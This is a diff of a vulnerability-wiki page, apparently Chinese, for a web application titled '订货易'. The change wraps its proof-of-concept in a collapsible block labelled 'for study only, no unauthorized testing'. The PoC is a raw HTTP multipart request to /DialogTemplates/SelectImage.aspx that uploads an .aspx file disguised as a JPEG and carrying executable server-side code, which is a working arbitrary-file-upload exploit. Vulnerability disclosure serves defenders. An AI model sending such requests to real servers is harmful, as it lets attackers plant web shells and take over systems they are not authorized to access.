@@ -35,8 +35,10 @@ title="订货易"
 
 poc
 
-```
-POST /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /DialogTemplates/SelectImage.aspx?type=titleimg&amp;size=30*100&amp;pageindex=1&amp;iscallback=true HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 Accept-Encoding: gzip
@@ -46,9 +48,10 @@ Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b
 Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
 Content-Type: image/jpeg
 
-<% Response.Write("Test"); %>
---532c7611457d40f4ae4cd9422973416b--"
-```
+&lt;% Response.Write("Test"); %&gt;
+--532c7611457d40f4ae4cd9422973416b--"</code></pre>
+
+</details>
 
 ![image-20231115102227428](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115102227428-17000150119182.png)
 
